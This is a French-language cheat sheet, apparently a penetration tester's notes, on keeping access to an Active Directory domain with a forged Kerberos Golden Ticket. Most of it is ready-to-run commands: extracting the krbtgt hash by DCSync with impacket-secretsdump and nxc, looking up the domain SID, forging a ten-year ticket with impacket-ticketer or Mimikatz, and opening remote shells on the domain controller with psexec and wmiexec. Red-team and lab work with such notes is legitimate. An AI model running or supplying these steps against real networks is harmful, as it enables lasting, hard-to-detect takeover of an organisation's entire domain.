# Persistence

## Golden Ticket

Forge un TGT entièrement offline en utilisant le hash NTLM du compte **krbtgt**. Permet de s'attribuer n'importe quels groupes/privilèges (Domain Admins, etc.) pour n'importe quel compte existant. Le DC accepte le ticket car il est chiffré avec la bonne clé.

> Prérequis : avoir compromis le DC ou un compte DA pour extraire le hash krbtgt.
> Durée par défaut : **10 ans** (contrairement aux TGT légitimes à 10h).
> Utiliser le **hostname** et non l'IP pour forcer Kerberos — avec l'IP, Windows bascule sur NTLM et l'accès est refusé.

**Linux**

1. Obtenir le hash krbtgt
```bash
# Depuis Kali via DCSync
impacket-secretsdump -just-dc-user krbtgt corp.com/<DA_user>:<password>@<IP_DC>
# ou
nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
# → noter le hash NTLM de krbtgt
```

2. Forger et injecter le Golden Ticket

```bash
# Obtenir le Domain SID
impacket-lookupsid corp.com/<user>:<password>@<IP_DC>
# → "Domain SID is: S-1-5-21-XXXX-XXXX-XXXX" affiché en premier

# Alternative — whoami /user sur le DC (retirer le RID final, ex: -500)
nxc smb <IP_DC> -u <user> -H <HASH> -x 'whoami /user'
# S-1-5-21-1987370270-658905905-1781884369-500 → Domain SID = S-1-5-21-1987370270-658905905-1781884369

# Forger le ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain corp.com <username>
# → génère <username>.ccache

# Charger et utiliser
export KRB5CCNAME=<username>.ccache
impacket-psexec -k -no-pass corp.com/<username>@DC1.corp.com -dc-ip <IP_DC> -target-ip <IP_DC>
impacket-wmiexec -k -no-pass corp.com/<username>@DC1.corp.com -dc-ip <IP_DC> -target-ip <IP_DC>
```

**Windows (Mimikatz)**

```
# Purger les tickets existants
kerberos::purge

# Forger et injecter le Golden Ticket
kerberos::golden /user:<user> /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# Ouvrir un shell et utiliser (hostname obligatoire, pas IP)
misc::cmd
```

```cmd
PsExec.exe \\DC1 cmd.exe
```

